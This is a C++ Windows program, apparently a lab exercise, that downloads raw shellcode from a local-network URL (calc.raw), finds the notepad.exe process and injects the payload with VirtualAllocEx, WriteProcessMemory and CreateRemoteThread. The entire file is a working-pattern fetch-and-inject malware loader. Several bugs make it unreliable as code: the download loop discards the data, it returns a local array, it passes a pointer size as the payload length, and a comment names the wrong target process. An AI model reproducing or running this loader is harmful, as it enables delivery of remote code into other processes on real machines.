#pragma comment(lib, "urlmon.lib")
#include <urlmon.h>
#include <cstdio>
#include <iostream>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <tlhelp32.h>
#include <string.h>
using namespace std;

// Given process name, return process ID
int walk(const char* processName) {
	wchar_t winProcName[260];
	size_t converted;

	mbstowcs_s(&converted, winProcName, processName, strlen(processName));
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == snapshot) {
		printf("Bad handle\n");
		return -1;
	}
	PROCESSENTRY32 proc;
	proc.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(snapshot, &proc)) {
		CloseHandle(snapshot);
		printf("Bad process");
		return -1;
	}
	while (Process32Next(snapshot, &proc)) {
		if (wcscmp(proc.szExeFile, winProcName) == 0) {
			printf("Found matching process");
			int pid = proc.th32ProcessID;
			CloseHandle(snapshot);
			return pid;
		}
	}
	printf("DIDN'T find matching process :(");
	return 0;
}

// Given a URL, download and return data
unsigned char* download(const char* payloadUrl) {
	IStream* stream;

	if (URLOpenBlockingStreamA(0, payloadUrl, &stream, 0, 0)) {
		return NULL;
	}
	printf("Connected to %s successfully\n", payloadUrl);

	char buff[100];
	//unsigned char* buffer[2048];
	string payload;
	unsigned long bytesRead;

	while (true) {
		stream->Read(buff, 100, &bytesRead);
		if (0U == bytesRead) {
			break;
		}
		//payload.append(buff, bytesRead);
		//memcpy()
	};

	stream->Release();

	unsigned char payloadArray[2040];
	strcpy((char*)payloadArray, payload.data());
	return payloadArray;
}

// Inject shellcode into remote process
int inject(HANDLE targetProc, unsigned char* payload, unsigned int payloadLen) {
	LPVOID addr = NULL;
	HANDLE threadHandle = NULL;
	SIZE_T bytesWritten;

	addr = VirtualAllocEx(targetProc, NULL, payloadLen, MEM_COMMIT, PAGE_EXECUTE_READ);
	WriteProcessMemory(targetProc, addr, (PVOID)payload, (SIZE_T)payloadLen, &bytesWritten);
	threadHandle = CreateRemoteThread(targetProc, NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, NULL, NULL);

	if (threadHandle != NULL) {
		printf("Payload is running...\n");
		WaitForSingleObject(threadHandle, -1);
		printf("Payload is done!\n");
		return 0;
	}

	return -1;
}

int main(void) {

	// Download payload shellcode
	const char* payloadUrl = "http://192.168.56.103/calc.raw";
	unsigned char* payload = download(payloadUrl);
	printf("payload data:\n%s\n", payload);

	// Find explorer.exe process
	int procID = walk("notepad.exe");
	printf("PID: %d\n", procID);

	// Open process
	if (procID <= 0) {
		printf("Failed to find/handle process :(\n");
		return -1;
	}
	HANDLE targetProc = OpenProcess(PROCESS_CREATE_THREAD |
		PROCESS_QUERY_INFORMATION |
		PROCESS_VM_OPERATION |
		PROCESS_VM_READ |
		PROCESS_VM_WRITE,
		FALSE,
		(DWORD)procID);

	// Inject payload
	int result = inject(targetProc, payload, sizeof(payload));

	// Close
	if (result == 0) {
		printf("Successfull inject!\n");
		return 0;
	}
	else {
		printf("Something went wrong :(\n");
		return -1;
	}
}
